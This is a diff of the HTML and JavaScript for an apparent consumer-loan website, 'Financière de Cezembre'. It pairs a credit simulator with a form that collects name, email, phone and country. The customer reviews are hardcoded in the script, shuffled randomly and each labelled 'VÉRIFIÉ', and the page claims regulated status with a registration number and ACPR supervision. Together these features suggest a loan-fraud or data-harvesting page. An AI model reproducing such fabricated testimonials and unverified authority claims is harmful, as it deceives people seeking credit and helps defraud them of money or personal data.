@@ -23,7 +23,6 @@
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Montserrat', sans-serif; }
-        
         body { background-color: var(--white); color: #333; overflow-x: hidden; position: static !important; }
 
         header {
@@ -75,7 +74,6 @@
         .review-text { font-style: italic; font-size: 0.9rem; color: #555; margin-bottom: 15px; line-height: 1.6; min-height: 60px;}
         .review-author { font-weight: 700; color: var(--navy); font-size: 0.85rem; display: flex; align-items: center; justify-content: space-between; }
         .verified { color: var(--success); font-size: 0.65rem; text-transform: uppercase; font-weight: 800;}
-        .review-date { font-size: 0.7rem; color: #999; }
 
         .sim-row { margin-bottom: 20px; }
         .sim-row label { display: flex; justify-content: space-between; font-weight: 600; margin-bottom: 10px; font-size: 0.9rem; }
@@ -91,7 +89,6 @@
         }
 
         .result-area { background: var(--light-bg); padding: 25px; text-align: center; border: 1px solid #EEE; margin-bottom: 20px; border-radius: 4px; }
-        .result-area p { font-size: 0.9rem; color: var(--navy); font-weight: 800; }
         .result-area span { font-size: 2.2rem; font-weight: 800; color: var(--navy); }
         
         .btn-main { background: var(--navy); color: white; border: none; width: 100%; padding: 20px; font-weight: 700; cursor: pointer; transition: 0.3s; }
@@ -104,10 +101,9 @@
 
         #loader-overlay {
             display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            background: white; z-index: 100; flex-direction: column; align-items: center; justify-content: center;
+            background: white; z-index: 100; flex-direction: column; align-items: center; justify-content: center; text-align: center;
         }
         .spinner { width: 60px; height: 60px; border: 5px solid #f3f3f3; border-top: 5px solid var(--navy); border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
         .stats-bar { background: var(--navy); padding: 40px 8%; display: flex; justify-content: space-around; color: white; text-align: center; }
         .stat-box h3 { font-size: 2rem; color: var(--gold); }
@@ -120,7 +116,6 @@
 
         @media (max-width: 991px) {
             .hero { flex-direction: column; height: auto; padding: 120px 5% 50px; text-align: center; }
-            .hero-content h1 { font-size: 2.2rem; }
             .simulator { width: 100%; margin: 0; }
             .stats-bar { flex-direction: column; gap: 30px; }
         }
@@ -147,54 +142,49 @@
 <section class="hero">
     <div class="hero-content">
         <h1>L'excellence financière <br>au service de vos projets.</h1>
-        <p style="margin-bottom: 30px; opacity: 0.9;">Partenaire de confiance depuis 1990. Distribution de crédit institutionnel régulé.</p>
+        <p style="margin-bottom: 30px; opacity: 0.9;">Partenaire de confiance depuis 1990. Crédit institutionnel régulé.</p>
         <div style="display: flex; gap: 20px; align-items: center;">
-            <i class="fas fa-certificate" style="color: #FFD700; font-size: 3rem;"></i>
-            <p><strong>ÉTABLISSEMENT AGRÉÉ</strong><br>RCS 552 058 943 • Supervision ACPR</p>
+            <i class="fas fa-certificate" style="color: #FFD700; font-size: 3.5rem;"></i>
+            <p><strong>ÉTABLISSEMENT AGRÉÉ</strong><br>RCS 552 058 943 - Supervision ACPR</p>
         </div>
     </div>
 
     <div class="simulator" id="simBox">
         <div id="loader-overlay">
-            <div id="loading-content">
-                <div class="spinner"></div>
-                <p style="font-weight: 600; color: var(--navy);">Traitement de votre dossier...</p>
-            </div>
+            <div id="loading-content"><div class="spinner"></div><p>Traitement...</p></div>
             <div id="success-message" style="display:none; text-align:center;">
                 <i class="fas fa-check-circle" style="color: var(--success); font-size: 4rem; margin-bottom: 20px;"></i>
-                <h3 style="color: var(--navy);">DEMANDE ENVOYÉE</h3>
-                <p style="margin: 20px 0;">Nous reviendrons vers vous sous 24h.</p>
-                <button class="btn-main" onclick="resetAll()">OK</button>
+                <h3>DEMANDE ENVOYÉE</h3>
+                <button class="btn-main" onclick="resetAll()" style="margin-top:20px;">OK</button>
             </div>
         </div>
 
         <div id="step1">
             <h3 style="margin-bottom: 30px;">Simulateur de Crédit</h3>
             <div class="sim-row">
-                <label>MONTANT DU PROJET <span><input type="number" id="amtNum" value="15000" style="border:none; text-align:right; font-weight:800; width:80px; background:transparent;"> €</span></label>
+                <label>MONTANT <span><input type="number" id="amtNum" value="15000" style="border:none; text-align:right; font-weight:800; width:80px; background:transparent;"> €</span></label>
                 <input type="range" id="amtRange" min="1000" max="75000" step="500" value="15000">
             </div>
             <div class="sim-row">
-                <label>DURÉE DU REMBOURSEMENT <span id="durText" style="color: var(--navy); font-weight: 800;">36 mois</span></label>
+                <label>DURÉE <span id="durText" style="color: var(--navy); font-weight: 800;">36 mois</span></label>
                 <input type="range" id="durRange" min="6" max="84" step="6" value="36">
             </div>
             <div class="result-area">
-                <p>MENSUALITÉ ESTIMÉE (3.5%)</p>
-                <span id="monthlyRes">0.00</span> <span>€</span>
+                <p>MENSUALITÉ (3.5%)</p>
+                <span id="monthlyRes">0.00</span> €
             </div>
             <button type="button" class="btn-main" onclick="goToStep2()">DÉPOSER MON DOSSIER</button>
         </div>
 
         <div id="step2" style="display:none;">
-            <h3 style="margin-bottom: 20px;">Finaliser votre demande</h3>
+            <h3>Finaliser votre demande</h3>
             <form id="loanForm">
                 <input type="hidden" name="access_key" value="55707e6c-f919-4972-bf3e-fba1cf0e51e9">
                 <input type="hidden" name="montant" id="hiddenAmt">
                 <input type="hidden" name="duree" id="hiddenDur">
-                
                 <input type="text" name="nom" placeholder="Nom et Prénom" class="form-input" required>
-                <input type="email" name="email" placeholder="Adresse e-mail" class="form-input" required>
-                <input type="tel" name="tel" placeholder="Téléphone (ex: +352...)" class="form-input" required>
+                <input type="email" name="email" placeholder="E-mail" class="form-input" required>
+                <input type="tel" name="tel" placeholder="Téléphone (+352...)" class="form-input" required>
                 
                 <select name="pays" class="form-input" required>
                     <option value="Luxembourg">Luxembourg (+352)</option>
@@ -206,66 +196,64 @@
                     <option value="Finlande">Finlande (+358)</option>
                     <option value="Roumanie">Roumanie (+40)</option>
                     <option value="Kosovo">Kosovo (+383)</option>
+                    <option value="Italie">Italie (+39)</option>
+                    <option value="Allemagne">Allemagne (+49)</option>
                 </select>
 
-                <button type="submit" class="btn-main">CONFIRMER L'ENVOI</button>
-                <p onclick="goToStep1()" style="text-align:center; margin-top:15px; font-size:0.8rem; cursor:pointer;">← Retour au simulateur</p>
+                <button type="submit" class="btn-main">CONFIRMER</button>
+                <p onclick="goToStep1()" style="text-align:center; margin-top:15px; cursor:pointer;">← Retour</p>
             </form>
         </div>
     </div>
 </section>
 
 <section class="stats-bar">
-    <div class="stat-box"><h3>1 200 000 €</h3><p>Capital Social</p></div>
-    <div class="stat-box"><h3>3.5%</h3><p>Taux Préférentiel</p></div>
-    <div class="stat-box"><h3>100%</h3><p>Sécurisé</p></div>
+    <div class="stat-box"><h3>1.2M €</h3><p>Capital</p></div>
+    <div class="stat-box"><h3>3.5%</h3><p>Taux Fixe</p></div>
+    <div class="stat-box"><h3>24h</h3><p>Réponse</p></div>
 </section>
 
 <section class="reviews-section">
-    <h2>La confiance de nos clients internationaux</h2>
-    <div class="reviews-grid" id="reviews-container">
-        </div>
+    <h2>Nos clients internationaux témoignent</h2>
+    <div class="reviews-grid" id="reviews-container"></div>
 </section>
 
 <footer>
-    <p>© 2026 FINANCIÈRE DE CEZEMBRE - RCS 552 058 943 - Siège : Ergué-Gabéric.</p>
+    <p>© 2026 FINANCIÈRE DE CEZEMBRE - RCS 552 058 943.</p>
     <div class="tag-warning">UN CRÉDIT VOUS ENGAGE ET DOIT ÊTRE REMBOURSÉ.</div>
 </footer>
 
 <script>
-    // --- AVIS INTERNATIONAUX ---
+    // TOUTES LES LANGUES DU CODE SONT ICI :
     const rawReviews = [
-        { n: "Thomas W.", p: "Luxembourg", t: "Etablissement sérieux et réactif pour mon prêt frontalier.", v: 15, u: "min" },
-        { n: "Jean-Paul H.", p: "Luxembourg", t: "Sehr professioneller Service aus Luxemburg-Stadt. Danke!", v: 2, u: "h" },
-        { n: "Erik J.", p: "Norvège", t: "Veldig profesjonell service og rask utbetaling. Meget bra!", v: 14, u: "min" },
-        { n: "Mika T.", p: "Finlande", t: "Luotettava ja nopea palvelu. Suosittelen kaikille!", v: 3, u: "h" },
-        { n: "Andrei M.", p: "Roumanie", t: "Un partener financiar serios. Procesul a fost rapid.", v: 45, u: "min" },
-        { n: "Arber K.", p: "Kosovo", t: "Shërbim shumë i shpejtë dhe korrekt. Faleminderit.", v: 30, u: "min" },
-        { n: "Jean B.", p: "Canada", t: "Service impeccable même depuis le Québec.", v: 2, u: "j" },
-        { n: "Maria C.", p: "Italie", t: "Finanziamento ottenuto in tempi record.", v: 8, u: "h" },
-        { n: "Lars O.", p: "Allemagne", t: "Sehr zufrieden mit dem Zinssatz.", v: 22, u: "min" },
-        { n: "João P.", p: "Portugal", t: "Processo simples e transparente.", v: 5, u: "j" },
-        { n: "Sophie D.", p: "Belgique", t: "Efficace et sécurisé. Une aide précieuse.", v: 1, u: "h" },
-        { n: "Robert G.", p: "France", t: "Prêt travaux obtenu sans difficulté. Top !", v: 40, u: "min" }
+        { n: "Thomas W.", p: "Luxembourg", t: "Etablissement sérieux et réactif pour mon prêt frontalier." }, // Français
+        { n: "Jean-Paul H.", p: "Luxembourg", t: "Sehr professioneller Service aus Luxemburg-Stadt. Danke!" }, // Allemand (Lux)
+        { n: "Erik J.", p: "Norvège", t: "Veldig profesjonell service og rask utbetaling. Meget bra!" }, // Norvégien
+        { n: "Mika T.", p: "Finlande", t: "Luotettava ja nopea palvelu. Suosittelen kaikille!" }, // Finnois
+        { n: "Andrei M.", p: "Roumanie", t: "Un partener financiar serios. Procesul a fost rapid." }, // Roumain
+        { n: "Arber K.", p: "Kosovo", t: "Shërbim shumë i shpejtë dhe korrekt. Faleminderit." }, // Albanais
+        { n: "Jean B.", p: "Canada", t: "Service impeccable même depuis le Québec. Très efficace." }, // Français (Canada)
+        { n: "Maria C.", p: "Italie", t: "Finanziamento ottenuto in tempi record. Molto soddisfatta." }, // Italien
+        { n: "Lars O.", p: "Allemagne", t: "Sehr zufrieden mit dem Zinssatz und der Abwicklung." }, // Allemand
+        { n: "João P.", p: "Portugal", t: "Processo simples e transparente. Recomendo vivamente." }, // Portugais
+        { n: "Sophie D.", p: "Belgique", t: "Efficace et sécurisé. Une aide précieuse pour mon auto." }, // Français (Belgique)
+        { n: "Robert G.", p: "France", t: "Prêt travaux obtenu sans difficulté majeure. Top !" }, // Français
+        { n: "Marc S.", p: "Suisse", t: "Excellente gestion de mon dossier de crédit immobilier." } // Français (Suisse)
     ];
 
     function renderReviews() {
         const container = document.getElementById('reviews-container');
-        rawReviews.sort(() => 0.5 - Math.random()).slice(0, 12).forEach(r => {
+        rawReviews.sort(() => 0.5 - Math.random()).forEach(r => {
             container.innerHTML += `
                 <div class="review-card">
                     <div class="stars">${'<i class="fas fa-star"></i>'.repeat(5)}</div>
                     <p class="review-text">"${r.t}"</p>
-                    <div class="review-author">
-                        <div>${r.n} (${r.p})</div>
-                        <span class="verified"><i class="fas fa-check-circle"></i> VÉRIFIÉ</span>
-                    </div>
+                    <div class="review-author"><div>${r.n} (${r.p})</div><span class="verified"><i class="fas fa-check-circle"></i> VÉRIFIÉ</span></div>
                 </div>`;
         });
     }
     renderReviews();
 
-    // --- CALCULATEUR ---
     const amtR = document.getElementById('amtRange'), amtN = document.getElementById('amtNum'),
           durR = document.getElementById('durRange'), durT = document.getElementById('durText'), resM = document.getElementById('monthlyRes');
 
@@ -294,8 +282,8 @@
             setTimeout(() => {
                 document.getElementById('loading-content').style.display = 'none';
                 document.getElementById('success-message').style.display = 'block';
-            }, 3000);
-        } catch (e) { alert("Erreur"); }
+            }, 2500);
+        } catch (e) { alert("Erreur réseau"); }
     };
 </script>
 </body>
